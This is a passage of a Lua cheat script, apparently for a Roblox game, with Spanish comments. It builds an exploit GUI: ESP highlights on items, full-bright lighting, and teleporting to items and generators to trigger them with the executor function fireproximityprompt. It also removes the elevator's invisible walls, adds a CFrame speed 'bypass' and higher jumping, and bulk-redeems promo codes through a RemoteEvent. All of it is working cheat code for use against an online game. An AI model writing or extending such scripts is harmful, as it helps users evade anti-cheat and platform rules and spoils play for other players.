	local starterGui = game:GetService("StarterGui")
	local runservice = game:GetService("RunService")

	-- Función para enviar una notificación con sonido
	local function sendNotificationWithSound(title, text, soundId, typeofnotif)
		local icon
		if typeofnotif == "error" then
			icon = "rbxassetid://2592670449" -- Ícono de error
		elseif typeofnotif == "warning" then
			icon = "rbxassetid://17453328281" -- Ícono de advertencia
		else
			icon = "rbxassetid://12900311435" -- Ícono de mensaje
		end

		starterGui:SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = 5, -- Duración de la notificación en segundos
			Icon = icon, -- Establecer el ícono basado en el tipo de notificación
		})

		-- Crear y reproducir un sonido
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://" .. soundId
		sound.Parent = workspace
		sound:Play()

		-- Destruir el sonido una vez que termine de reproducirse
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end

	-- Definir la variable esp
	local NewREsp = Instance.new("Highlight")
	NewREsp.Name = "hl2"
	NewREsp.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
	NewREsp.OutlineTransparency = 1

	-- Obtener el botón
	local button = script.Parent
	local isActiveItemESP = false -- Estado del toggle

	-- Definir los colores
	local greenColor = Color3.fromRGB(0, 255, 0) -- Verde
	local whiteColor = Color3.fromRGB(255, 255, 255) -- Blanco

	-- Configurar la información del Tween
	local tweenInfo = TweenInfo.new(
		0.2, -- Duración del Tween (0.2 segundos para un cambio rápido)
		Enum.EasingStyle.Sine, -- Suavizado Sine para un cambio suave
		Enum.EasingDirection.Out -- Suavizado hacia afuera (Out)
	)

	-- Crear los Tweens
	local function tweenToColorR(targetColor)
		local tween = game.TweenService:Create(button, tweenInfo, {BackgroundColor3 = targetColor})
		tween:Play()
	end

	-- Definir la lógica para alternar el código cuando se presiona el botón
	local function toggleItemsESP()
		if isActiveItemESP then
			isActiveItemESP = false
			tweenToColorR(whiteColor) -- Cambiar el color del botón a blanco cuando está inactivo
		else
			isActiveItemESP = true
			tweenToColorR(greenColor) -- Cambiar el color del botón a verde cuando está activo

			-- Ejecutar la lógica
			task.spawn(function()
				local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")
				if not currentRoom then
					sendNotificationWithSound("Error", "CurrentRoom not found!", "478544929", "error")
					return
				end

				local hasItems = false -- Variable para verificar si hay items
				for _, roomModel in pairs(currentRoom:GetChildren()) do
					if roomModel:IsA("Model") then
						local itemsFolder = roomModel:FindFirstChild("Items")
						if not itemsFolder then
							sendNotificationWithSound("Error", "Items folder not found in " .. roomModel.Name, "478544929", "error")
							return
						end

						hasItems = true
						for _, item in pairs(itemsFolder:GetChildren()) do
							runservice.Heartbeat:Connect(function()
								if item:IsA("Model") or item:IsA("BasePart") then -- Detectar solo BaseParts
									if not item:FindFirstChild("hl2") then
										sendNotificationWithSound("ESP", "Cloning ESP to " .. item.Name, "478544929")
										local hl2clone = NewREsp:Clone()
										hl2clone.Adornee = item
										hl2clone.Parent = item
									end
								end
							end)
						end
					end
				end

				if not hasItems then
					sendNotificationWithSound("Error", "No items found in the current room!", "478544929", "error")
				end
			end)
		end
	end

	-- Detectar cuando se hace clic en el botón
	button.MouseButton1Click:Connect(function()
		toggleItemsESP()
	end)

end;
task.spawn(C_66);
-- StarterGui.DebugVersion.Title.script_content.Main.Aut.LocalScript
local function C_6b()
	local script = G2L["6b"];
	local Lighting = game:GetService("Lighting")

	-- Función para aplicar el modo Full Bright
	local function applyFullBright()
		if Lighting.Brightness ~= 2 or Lighting.FogEnd ~= 100000 or not Lighting.GlobalShadows or Lighting.OutdoorAmbient ~= Color3.fromRGB(128, 128, 128) then
			Lighting.Brightness = 2
			Lighting.FogEnd = 100000
			Lighting.GlobalShadows = false
			Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
		end
	end

	-- Escuchar cambios en la iluminación una sola vez
	local isLightingChangedConnected = false
	local function ensureLightingListener()
		if not isLightingChangedConnected then
			Lighting.LightingChanged:Connect(applyFullBright)
			isLightingChangedConnected = true
		end
	end

	-- Al hacer clic en el botón, aplicar Full Bright y asegurar el listener
	script.Parent.MouseButton1Click:Connect(function()
		applyFullBright()
		ensureLightingListener()
	end)

end;
task.spawn(C_6b);
-- StarterGui.DebugVersion.Title.script_content.Main.monsters.LocalScript
local function C_6e()
	local script = G2L["6e"];
	local starterGui = game:GetService("StarterGui")
	local runservice = game:GetService("RunService")

	-- Función para enviar una notificación con sonido
	local function sendNotificationWithSound(title, text, soundId, typeofnotif)
		local icon
		if typeofnotif == "error" then
			icon = "rbxassetid://2592670449" -- Ícono de error
		elseif typeofnotif == "warning" then
			icon = "rbxassetid://17453328281" -- Ícono de advertencia
		else
			icon = "rbxassetid://12900311435" -- Ícono de mensaje
		end

		starterGui:SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = 5, -- Duración de la notificación en segundos
			Icon = icon, -- Establecer el ícono basado en el tipo de notificación
		})

		-- Crear y reproducir un sonido
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://" .. soundId
		sound.Parent = workspace
		sound:Play()

		-- Destruir el sonido una vez que termine de reproducirse
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end

	local player = game.Players.LocalPlayer
	local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")
	local playerGui = player:WaitForChild("PlayerGui")



	local button = script.Parent -- Asume que este script está dentro de un botón
	local proximityPrompts = {} -- Tabla para almacenar los ProximityPrompts

	-- Buscar todos los Items y sus ProximityPrompts en cada modelo de CurrentRoom


	-- Función para teletransportar al jugador y activar el ProximityPrompt
	local function activateProximityPrompts()
		local originalPosition = player.Character.HumanoidRootPart.Position -- Guardar posición original

		for _, prompt in ipairs(proximityPrompts) do
			-- Teletransportar al jugador al Tape

			sendNotificationWithSound("Going To", "the item",  "478544929")
			local tapePosition = prompt.Parent.Position -- Posición del Tape
			player.Character.HumanoidRootPart.CFrame = CFrame.new(tapePosition) -- Teletransporta al jugador

			-- Esperar un momento para asegurar que el jugador esté en la posición correcta
			wait(0.5)

			-- Activar el ProximityPrompt
			if prompt then
				fireproximityprompt(prompt) -- Llama a la función para activar el ProximityPrompt
				wait(0.5) -- Esperar un poco antes de continuar
			end
		end

		-- Regresar al jugador a su posición original
		player.Character.HumanoidRootPart.CFrame = CFrame.new(originalPosition)
	end

	-- Conectar la función al evento del botón
	button.MouseButton1Click:Connect(function()
		table.clear(proximityPrompts) -- Vaciar la lista antes de llenarla nuevamente
		wait()
		local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")

		if not currentRoom then
			sendNotificationWithSound("Error", "CurrentRoom not found!", "478544929", "error")
			return
		end

		for _, roomModel in pairs(currentRoom:GetChildren()) do
			if roomModel:IsA("Model") then
				local itemsFolder = roomModel:FindFirstChild("Items")

				if not itemsFolder then
					sendNotificationWithSound("Error", "Items folder not found in " .. roomModel.Name, "478544929", "error")
					return
				end

				-- Buscar todos los Tapes y sus ProximityPrompts en la carpeta Items
				for _, item in pairs(itemsFolder:GetChildren()) do
					if  item:FindFirstChild("Prompt") and item.Prompt:FindFirstChild("ProximityPrompt") then
						--si el item.name contiene la palabra "fake", entonces manda una notificacion de advertencia y lo excluye
						if string.find(string.lower(item.Name), "fake") then
							sendNotificationWithSound("Warning", "Fake item found: " .. item.Name, "478544929", "error")
							continue -- Salta el resto del código y continúa con el siguiente item
						end
						sendNotificationWithSound("Items List", "Inserting "..item.Name,  "478544929")
						table.insert(proximityPrompts, item.Prompt.ProximityPrompt)
					end
				end
			end
		end
		wait(1)

		if #proximityPrompts > 0 then
			activateProximityPrompts() -- Activar los ProximityPrompts
		else
			sendNotificationWithSound("Error", "No items found!", "478544929", "error")
		end
	end)

end;
task.spawn(C_6e);
-- StarterGui.DebugVersion.Title.script_content.Main.Aut.LocalScript
local function C_71()
	local script = G2L["71"];
	local function Debug(str, keynum)
		if script.Parent.Parent.Parent.options.debug.Visible == true then return end

		if keynum == 1 then --just a message
			print("[DEBUG]: "..str)
		elseif keynum == 2 then --warning
			print("[DEBUG_WARN]: "..str)
		elseif keynum == 3 then --error
			print("[DEBUG_ERROR]: "..str)
		elseif keynum == 4 then --sucess
			print("[DEBUG_SUCESS]: "..str)
		elseif not keynum then
			print("[¿DEBUG?]: "..str)
		end
	end

	script.Parent.MouseButton1Click:Connect(function()
		Debug("Now The LocalPlayer Spins Forever", 4)
		local Spin = Instance.new("BodyAngularVelocity")
		Spin.Name = "Spinning"
		Spin.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
		Spin.MaxTorque = Vector3.new(0, math.huge, 0)
		Spin.AngularVelocity = Vector3.new(0,100,0)
	end)
end;
task.spawn(C_71);
-- StarterGui.DebugVersion.Title.script_content.Main.Aut.LocalScript
local function C_74()
	local script = G2L["74"];

	local function sendNotificationWithSound(title, text, soundId, typeofnotif)
		local icon
		if typeofnotif == "error" then
			icon = "rbxassetid://2592670449" -- Ícono de error
		elseif typeofnotif == "warning" then
			icon = "rbxassetid://17453328281" -- Ícono de advertencia
		else
			icon = "rbxassetid://12900311435" -- Ícono de mensaje
		end

		game.StarterGui:SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = 5, -- Duración de la notificación en segundos
		})

		-- Crear y reproducir un sonido
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://" .. soundId
		sound.Parent = workspace
		sound:Play()

		-- Destruir el sonido una vez que termine de reproducirse
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end
	local function Debug(str, keynum)
		if script.Parent.Parent.Parent.options.debug.Visible == true then return end

		if keynum == 1 then --just a message
			print("[DEBUG]: "..str)
		elseif keynum == 2 then --warning
			print("[DEBUG_WARN]: "..str)
		elseif keynum == 3 then --error
			print("[DEBUG_ERROR]: "..str)
		elseif keynum == 4 then --sucess
			print("[DEBUG_SUCESS]: "..str)
		elseif not keynum then
			print("[¿DEBUG?]: "..str)
		end
	end

	script.Parent.MouseButton1Click:Connect(function()
		local elevator = workspace:FindFirstChild("Elevators"):FindFirstChild("Elevator")
		if elevator then
			for _, v in pairs(elevator:GetDescendants()) do
				if v.Name:lower() == "inviswall" and v:IsA("BasePart") then
					sendNotificationWithSound("Elevators", "Removing inviswall...", 478544929)
					Debug("Deleting "..v.Name.." From Elevator", 4)
					v:Destroy() -- Usar Destroy() en lugar de Remove()
				end
			end
		else
			Debug("Elevator not found while trying to do process...", 3)
			sendNotificationWithSound("Elevators", "elevator not found...", 478544929)
		end
	end)

end;
task.spawn(C_74);
-- StarterGui.DebugVersion.Title.script_content.Main.Aut.LocalScript
local function C_77()
	local script = G2L["77"];
	-- Servicios
	local VirtualInputManager = game:GetService("VirtualInputManager")
	local player = game:GetService("Players").LocalPlayer
	local TweenService = game:GetService("TweenService")
	local button = script.Parent
	-- Definir los colores
	local greenColor = Color3.fromRGB(0, 255, 0) -- Verde
	local whiteColor = Color3.fromRGB(255, 255, 255) -- Blanco

	-- Configurar la información del Tween
	local tweenInfo = TweenInfo.new(
		0.2, -- Duración del Tween (0.2 segundos para un cambio rápido)
		Enum.EasingStyle.Sine, -- Suavizado Sine para un cambio suave
		Enum.EasingDirection.Out -- Suavizado hacia afuera (Out)
	)

	-- Crear los Tweens
	local function tweenToColor(targetColor)
		return TweenService:Create(button, tweenInfo, {BackgroundColor3 = targetColor})
	end

	-- Detectar cuando el mouse entra en el botón
	button.MouseEnter:Connect(function()
		local tween = tweenToColor(greenColor) -- Cambiar a verde
		tween:Play()
	end)

	-- Detectar cuando el mouse sale del botón
	button.MouseLeave:Connect(function()
		local tween = tweenToColor(whiteColor) -- Cambiar a blanco
		tween:Play()
	end)
	-- Función para enviar una notificación con sonido
	local function sendNotificationWithSound(title, text, soundId, typeofnotif)
		local icon
		if typeofnotif == "error" then
			icon = "rbxassetid://2592670449" -- Ícono de error
		elseif typeofnotif == "warning" then
			icon = "rbxassetid://17453328281" -- Ícono de advertencia
		else
			icon = "rbxassetid://12900311435" -- Ícono de mensaje
		end

		game.StarterGui:SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = 5, -- Duración de la notificación en segundos
			Icon = icon
		})

		-- Crear y reproducir un sonido
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://" .. soundId
		sound.Parent = workspace
		sound:Play()

		-- Destruir el sonido una vez que termine de reproducirse
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end

	-- Función para teletransportar al jugador
	local function TP(Target)
		print("Teleport called to "..Target.Name)
		local LocalPlayer = game.Players.LocalPlayer
		local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

		if typeof(Target) == "Instance" then
			if Target:IsA("Model") and Target.PrimaryPart then
				Character:SetPrimaryPartCFrame(Target.PrimaryPart.CFrame)
			elseif Target:IsA("BasePart") then
				Character:SetPrimaryPartCFrame(Target.CFrame)
			else
				warn("Target is neither a Model with a PrimaryPart nor a BasePart")
			end
		else
			warn("Invalid target for teleportation")
		end
	end

	-- Función para obtener la carpeta Generators
	local function getGeneratorsFolder()
		print("[DEBUG]: trying to get generators folder")
		local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")

		if not currentRoom then
			sendNotificationWithSound("Error", "CurrentRoom not found!", "478544929", "error")
			print("[DEBUG]: trying to get generators folder FAILED due to CurrentRoom")
			return nil -- No se encontró CurrentRoom
		end
		print("[DEBUG]: trying to get generators folder Passed to RoomModel")
		for _, roomModel in pairs(currentRoom:GetChildren()) do
			if roomModel:IsA("Model") then
				print("[DEBUG]: trying to get generators...")
				local generatorsFolder = roomModel:FindFirstChild("Generators")
				print("[DEBUG]: trying to get generators")
				if generatorsFolder then
					print("[DEBUG]: Returning generators folder...")
					return generatorsFolder -- Devuelve la carpeta Generators si se encuentra
				else
					print("[DEBUG]: trying to get generators folder FAILED due to "..roomModel.Name)
					sendNotificationWithSound("Error", "Generators folder not found in " .. roomModel.Name, "478544929", "error")
				end
			end
		end
		print("[DEBUG]: trying to get generators folder FAILED due to not found in any model")
		sendNotificationWithSound("Error", "No Generators folder found in any model!", "478544929", "error")
		return nil
	end
	local function isStringValueEmpty(stringValue)
		print("IsStringValue Called")
		if stringValue then
			local value = stringValue.Value
			return value == nil or value == "" or value == " " or value == "nil"
		else
			warn("El objeto no es un StringValue válido.")
			return true -- Retorna true si no es un StringValue
		end
	end


	-- Función que ejecuta las acciones de teletransportación y activación
	local function handleGenerators(Generators)
		print("[TEST]: called handleGenerators...")
		for _, generator in pairs(Generators:GetChildren()) do
			print("[TEST]: getting generator...")
			print(generator.Name)
			local ActivePlayer = generator.Stats.ActivePlayer
			local IsDone = generator.Stats.Completed
			local BPToTP = generator.TeleportPositions.TeleportPosition
			local ProximityPrompt = generator.Prompt.ProximityPrompt
			print(BPToTP)
			print(ProximityPrompt)
			print(IsDone)
			print(ActivePlayer)
			print("[checking these values]")
			-- Verifica si no hay jugador activo y si no está completado
			if isStringValueEmpty(ActivePlayer) and not IsDone.Value then
				print("Teleporting!")
				TP(BPToTP)  -- Teletransporta al jugador
				wait(0.5)
				print("Activating PP!")
				fireproximityprompt(ProximityPrompt) -- Activa el ProximityPrompt
			else
				print("[DEBUG]: cannot TP ///: ActivePlayer: "..ActivePlayer.Value.." / IsDone: "..IsDone.Value)
			end
		end
	end

	-- Evento de click en el botón
	script.Parent.MouseButton1Click:Connect(function()
		print("button clicked")
		local Generators = getGeneratorsFolder()
		print("getting generators folder INBUTTON")
		if Generators then
			print("handlegenerators(Generators)")
			handleGenerators(Generators) -- Ejecutar la lógica con los generadores
		else
			print("no generators folder INBUTTON")
			sendNotificationWithSound("Error", "No Generators available to process!", "478544929", "error")
		end
	end)

	--12900311435
end;
task.spawn(C_77);
-- StarterGui.DebugVersion.Title.script_content.Main.Aut.LocalScript
local function C_7a()
	local script = G2L["7a"];
	local RunService = game:GetService("RunService")
	local TweenService = game:GetService("TweenService")
	local button = script.Parent
	local NowIsActive = false
	local connection

	-- Definir los colores
	local greenColor = Color3.fromRGB(0, 255, 0) -- Verde
	local whiteColor = Color3.fromRGB(255, 255, 255) -- Blanco

	-- Configurar la información del Tween
	local tweenInfo = TweenInfo.new(
		0.2, -- Duración del Tween (0.2 segundos para un cambio rápido)
		Enum.EasingStyle.Sine, -- Suavizado Sine para un cambio suave
		Enum.EasingDirection.Out -- Suavizado hacia afuera (Out)
	)

	-- Función para crear los Tweens
	local function tweenToColor(targetColor)
		return TweenService:Create(button, tweenInfo, {BackgroundColor3 = targetColor})
	end

	-- Detectar cuando el mouse entra en el botón
	button.MouseEnter:Connect(function()
		tweenToColor(greenColor):Play() -- Cambiar a verde
	end)

	-- Detectar cuando el mouse sale del botón
	button.MouseLeave:Connect(function()
		tweenToColor(whiteColor):Play() -- Cambiar a blanco
	end)

	-- Función de depuración
	local function Debug(str, keynum)
		local debugUI = script.Parent.Parent.Parent.options.debug

		if debugUI.Visible == true then return end

		local debugTypes = {
			[1] = "[DEBUG]: ",
			[2] = "[DEBUG_WARN]: ",
			[3] = "[DEBUG_ERROR]: ",
			[4] = "[DEBUG_SUCCESS]: ",
			default = "[DEBUG?]: "
		}

		local prefix = debugTypes[keynum] or debugTypes.default
		print(prefix .. str)
	end

	-- Función para teletransportar al jugador
	local function TP(Target)
		local LocalPlayer = game.Players.LocalPlayer
		local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

		if Target:IsA("Model") and Target.PrimaryPart then
			Character:SetPrimaryPartCFrame(Target.PrimaryPart.CFrame)
		elseif Target:IsA("BasePart") then
			Character:SetPrimaryPartCFrame(Target.CFrame)
		else
			warn("Target is neither a Model with a PrimaryPart nor a BasePart")
		end
	end

	-- Evento al hacer clic en el botón
	script.Parent.MouseButton1Click:Connect(function()
		if NowIsActive then return end
		NowIsActive = true

		-- Conectar una única vez al evento RenderStepped
		if not connection then
			connection = RunService.RenderStepped:Connect(function()
				local elevator = workspace:FindFirstChild("Elevators"):FindFirstChild("Elevator")
				local IsPanic = workspace.Info.Panic

				if elevator and elevator:FindFirstChild("Opened") and elevator.Opened.Value == true and IsPanic.Value == true then
					local BasePart = elevator:FindFirstChild("SpawnZones")

					if BasePart then
						Debug("Teleporting to 'SpawnZones'", 4)
						TP(BasePart) -- Teletransportar al BasePart
					else
						Debug("BasePart 'SpawnZones' not found in the elevator", 3)
					end
				end
			end)
		end
	end)

end;
task.spawn(C_7a);
-- StarterGui.DebugVersion.Title.script_content.Main.monsters.LocalScript
local function C_7d()
	local script = G2L["7d"];
	local starterGui = game:GetService("StarterGui")
	local runservice = game:GetService("RunService")

	-- Función para enviar una notificación con sonido
	local function sendNotificationWithSound(title, text, soundId, typeofnotif)
		local icon
		if typeofnotif == "error" then
			icon = "rbxassetid://2592670449" -- Ícono de error
		elseif typeofnotif == "warning" then
			icon = "rbxassetid://17453328281" -- Ícono de advertencia
		else
			icon = "rbxassetid://12900311435" -- Ícono de mensaje
		end

		starterGui:SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = 5, -- Duración de la notificación en segundos
			Icon = icon, -- Establecer el ícono basado en el tipo de notificación
		})

		-- Crear y reproducir un sonido
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://" .. soundId
		sound.Parent = workspace
		sound:Play()

		-- Destruir el sonido una vez que termine de reproducirse
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end

	local player = game.Players.LocalPlayer
	local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")
	local playerGui = player:WaitForChild("PlayerGui")



	local button = script.Parent -- Asume que este script está dentro de un botón
	local proximityPrompts = {} -- Tabla para almacenar los ProximityPrompts

	-- Buscar todos los Items y sus ProximityPrompts en cada modelo de CurrentRoom


	-- Función para teletransportar al jugador y activar el ProximityPrompt
	local function activateProximityPrompts()
		local originalPosition = player.Character.HumanoidRootPart.Position -- Guardar posición original

		for _, prompt in ipairs(proximityPrompts) do
			-- Teletransportar al jugador al Tape

			sendNotificationWithSound("Going To", "the ResearchCapsule",  "478544929")
			local tapePosition = prompt.Parent.Position -- Posición del Tape
			player.Character.HumanoidRootPart.CFrame = CFrame.new(tapePosition) -- Teletransporta al jugador

			-- Esperar un momento para asegurar que el jugador esté en la posición correcta
			wait(0.5)

			-- Activar el ProximityPrompt
			if prompt then
				fireproximityprompt(prompt) -- Llama a la función para activar el ProximityPrompt
				wait(0.5) -- Esperar un poco antes de continuar
			end
		end

		-- Regresar al jugador a su posición original
		player.Character.HumanoidRootPart.CFrame = CFrame.new(originalPosition)
	end

	-- Conectar la función al evento del botón
	button.MouseButton1Click:Connect(function()
		table.clear(proximityPrompts) -- Vaciar la lista antes de llenarla nuevamente
		wait() 
		local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")

		if not currentRoom then
			sendNotificationWithSound("Error", "CurrentRoom not found!", "478544929", "error")
			return
		end

		for _, roomModel in pairs(currentRoom:GetChildren()) do
			if roomModel:IsA("Model") then
				local itemsFolder = roomModel:FindFirstChild("Items")

				if not itemsFolder then
					sendNotificationWithSound("Error", "Items folder not found in " .. roomModel.Name, "478544929", "error")
					return
				end

				-- Buscar todos los Tapes y sus ProximityPrompts en la carpeta Items
				for _, item in pairs(itemsFolder:GetChildren()) do
					if item.Name:lower() == "researchcapsule" and item:FindFirstChild("Prompt") and item.Prompt:FindFirstChild("ProximityPrompt") then
						sendNotificationWithSound("ResearchCapsule List", "Inserting ResearchCapsule",  "478544929")
						table.insert(proximityPrompts, item.Prompt.ProximityPrompt)
					end
				end
			end
		end
		wait(1)

		if #proximityPrompts > 0 then
			activateProximityPrompts() -- Activar los ProximityPrompts
		else
			sendNotificationWithSound("Error", "No tapes found!", "478544929", "error")
		end
	end)

end;
task.spawn(C_7d);
-- StarterGui.DebugVersion.Title.script_content.Main.Aut.LocalScript
local function C_80()
	local script = G2L["80"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Main.Visible = false
		script.Parent.Parent.Parent.MainTwo.Visible = true

	end)
end;
task.spawn(C_80);
-- StarterGui.DebugVersion.Title.script_content.MainTwo.Aut.LocalScript
local function C_86()
	local script = G2L["86"];
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	-- Función para enviar una notificación
	local function sendNotification(title, text)
		StarterGui:SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = 5, -- Duración de la notificación en segundos
		})
	end

	local function TP(Target)
		local LocalPlayer = game.Players.LocalPlayer
		local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

		-- Verifica si el objetivo es un BasePart y teletransporta
		if typeof(Target) == "Instance" and Target:IsA("BasePart") then
			Character:SetPrimaryPartCFrame(Target.CFrame)
		else
			warn("Target is not a valid BasePart for teleportation")
		end
	end
	local function Debug(str, keynum)
		if script.Parent.Parent.Parent.options.debug.Visible == true then return end

		if keynum == 1 then --just a message
			print("[DEBUG]: "..str)
		elseif keynum == 2 then --warning
			print("[DEBUG_WARN]: "..str)
		elseif keynum == 3 then --error
			print("[DEBUG_ERROR]: "..str)
		elseif keynum == 4 then --sucess
			print("[DEBUG_SUCESS]: "..str)
		elseif not keynum then
			print("[¿DEBUG?]: "..str)
		end
	end


	local function checkGates()
		-- Recorre todos los objetos en el workspace
		for _, model in ipairs(workspace:GetChildren()) do
			-- Verifica si el nombre del modelo es "gate"
			if model:IsA("Model") and model.Name:lower() == "gate" then
				-- Intenta acceder a los componentes de SurfaceGui
				local guiPart = model:FindFirstChild("GuiPart")
				if guiPart and guiPart:IsA("BasePart") then
					local surfaceGui = guiPart:FindFirstChild("SurfaceGui")
					if surfaceGui then
						local frame = surfaceGui:FindFirstChild("Frame")
						if frame then
							local playersTextLabel = frame:FindFirstChild("players")
							if playersTextLabel and playersTextLabel:IsA("TextLabel") then
								local textValue = playersTextLabel.Text

								-- Comprobar si el texto coincide con "7/8", "7 / 8", "7/ 8" o "7 /8"
								if textValue == "7/8" or textValue == "7 / 8" or textValue == "7/ 8" or textValue == "7 /8" then
									Debug("Model '" .. model.Name .. "' haves the correct text: " .. textValue, 4)
									-- Teletransporta al jugador al GuiPart
									TP(guiPart)
									return -- Sale de la función después de teletransportar
								else

								end
							end
						end
					end
				end
			end
		end
	end

	script.Parent.MouseButton1Click:Connect(function()
		game["Run Service"].RenderStepped:Connect(function()
			checkGates()
		end)
	end)
end;
task.spawn(C_86);
-- StarterGui.DebugVersion.Title.script_content.MainTwo.Aut.LocalScript
local function C_89()
	local script = G2L["89"];
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	-- Función para enviar una notificación
	local function sendNotification(title, text)
		StarterGui:SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = 5, -- Duración de la notificación en segundos
		})
	end
	local function Debug(str, keynum)
		if script.Parent.Parent.Parent.options.debug.Visible == true then return end

		if keynum == 1 then --just a message
			print("[DEBUG]: "..str)
		elseif keynum == 2 then --warning
			print("[DEBUG_WARN]: "..str)
		elseif keynum == 3 then --error
			print("[DEBUG_ERROR]: "..str)
		elseif keynum == 4 then --sucess
			print("[DEBUG_SUCESS]: "..str)
		elseif not keynum then
			print("[¿DEBUG?]: "..str)
		end
	end
	local function redeem(code)
		if not code or code == "" then
			Debug("Redeem code "..code.."  not specified...", 4)
			sendNotification("Error", "invalid code")
			return
		end
		Debug("Redeem code "..code.." Using CodeEvent...", 4)
		local args = {
			[1] = code
		}

		ReplicatedStorage.Events.CodeEvent:FireServer(unpack(args))

	end

	script.Parent.MouseButton1Click:Connect(function()
		--SKINTICKET: Use for 150 Ichor (New)
		--2HUNDREDMILLION: Use for 150 Ichor (New)
		--HUNDREDMILLION: Use for 150 Ichor (New)
		--FIFTYMILLION: Use for 150 Ichor
		--TENMILLION: Use for 150 Ichor
		--ICHOR: Use for 50 Ichor
		--ONETHOUSAND: Use for 50 Ichor
		--redeem all of them
		redeem("SKINTICKET")
		wait(1)
		redeem("2HUNDREDMILLION")
		wait(1)
		redeem("HUNDREDMILLION")
		wait(1)
		redeem("FIFTYMILLION")
		wait(1)
		redeem("TENMILLION")
		wait(1)
		redeem("ICHOR")
		wait(1)
		redeem("ONETHOUSAND")
	end)
end;
task.spawn(C_89);
-- StarterGui.DebugVersion.Title.script_content.MainTwo.Aut.LocalScript
local function C_8c()
	local script = G2L["8c"];
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	-- Función para enviar una notificación
	local function sendNotification(title, text)
		StarterGui:SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = 5, -- Duración de la notificación en segundos
		})
	end
	local function Debug(str, keynum)
		if script.Parent.Parent.Parent.options.debug.Visible == true then return end

		if keynum == 1 then --just a message
			print("[DEBUG]: "..str)
		elseif keynum == 2 then --warning
			print("[DEBUG_WARN]: "..str)
		elseif keynum == 3 then --error
			print("[DEBUG_ERROR]: "..str)
		elseif keynum == 4 then --sucess
			print("[DEBUG_SUCESS]: "..str)
		elseif not keynum then
			print("[¿DEBUG?]: "..str)
		end
	end
	local function isMoving()
		local character = game.Players.LocalPlayer.Character
		if character and character:FindFirstChild("Humanoid") then
			local moveDirection = character.Humanoid.MoveDirection
			return moveDirection.Magnitude > 0 and not character.Humanoid.Sit and not character.Humanoid.PlatformStand
		end
		return false
	end

	-- Bucle de movimiento con bypass de velocidad
	local isRunning = true
	local localPlayer = game:GetService("Players").LocalPlayer
	script.Parent.MouseButton1Click:Connect(function()
		local Spin = Instance.new("BodyAngularVelocity")
		Spin.Name = "Spinning"
		Spin.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
		Spin.MaxTorque = Vector3.new(0, math.huge, 0)
		Spin.AngularVelocity = Vector3.new(0,100,0)

		local localPlayer = game:GetService("Players").LocalPlayer
		local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid")
		local adasd = true -- Comenzar activado

		-- Aumentar los parámetros de salto
		task.spawn(function()
			while adasd and humanoid do
				humanoid.JumpPower = 55 -- Cambiar JumpPower a 50
				humanoid.UseJumpPower = true -- Activar el uso de JumpPower
				humanoid.JumpHeight = 7.3 -- Cambiar JumpHeight a 7.3
				task.wait(1) -- Pausa para evitar que se sobrecargue el ciclo
			end
		end)
		task.spawn(function()
			while true do
				task.wait()
				if isRunning and isMoving() then
					local character = localPlayer.Character
					if character and character:FindFirstChild("HumanoidRootPart") then
						-- Aplicar el bypass de velocidad
						character.HumanoidRootPart.CFrame = character.HumanoidRootPart.CFrame + character.Humanoid.MoveDirection * 1.5
						game:GetService("RunService").Stepped:Wait() -- Esperar un ciclo del juego para la ejecución fluida
					end
				end
			end
		end)
	end)
end;
task.spawn(C_8c);
-- StarterGui.DebugVersion.Title.script_content.MainTwo.AutoDistarctHandler
local function C_95()
	local script = G2L["95"];
	print("[DEBUG]: INICIANDO SCRIPT")
	wait(4)
	print("[DEBUG]: PERMITIENDO ACCESO...")
	local Frame = script.Parent
	local AutoDistract = {
		-------------------------
		startBTN = Frame.start,
		stopBTN = Frame.stop,
		selectBTN = Frame.select,
		-------------------------
		MonstersSelected = {},
		CurrentlyRunning = false,
		CurrentMonsterIndex = 1,  -- Índice para cambiar entre los monstruos
	}

	-- Función para seleccionar un monstruo
	function AutoDistract:SelectMonster(monster)
		if monster then
			print("DEBUG: Seleccionando monstruo:", monster.Name) -- Depuración
			-- Limpiar la lista anterior y asignar el nuevo monstruo
			AutoDistract.MonstersSelected = {monster}
			-- Mostrar el nombre del monstruo seleccionado en el botón de selección
			AutoDistract.selectBTN.Text = "Selected: " .. monster.Name
			print("Monster selected: " .. monster.Name)
		else
			print("DEBUG: No se seleccionó ningún monstruo.") -- Depuración
		end
	end

	-- Función para enviar notificación con sonido
	local function sendNotificationWithSound(title, text, soundId, typeofnotif)
		local icon
		print("DEBUG: Enviando notificación:", title, text) -- Depuración
